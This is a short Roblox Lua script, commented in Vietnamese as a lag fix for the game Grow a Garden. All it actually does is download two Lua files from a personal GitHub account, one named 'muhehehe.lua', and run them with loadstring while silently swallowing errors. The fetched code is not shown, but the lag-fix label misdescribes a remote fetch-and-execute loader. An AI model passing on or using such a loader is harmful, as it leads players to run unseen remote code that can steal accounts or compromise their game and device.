-- Fix lag cho Grow a Garden
local gagUrls = {  
    "https://raw.githubusercontent.com/fanytgame1234-blip/1234/main/muhehehe.lua", 
    "https://raw.githubusercontent.com/fanytgame1234-blip/1234/main/delete_model_plantgag.lua"
}

for i, url in ipairs(gagUrls) do
    task.wait(10 * (i - 1))
    pcall(function()
        loadstring(game:HttpGet(url))()
    end)
end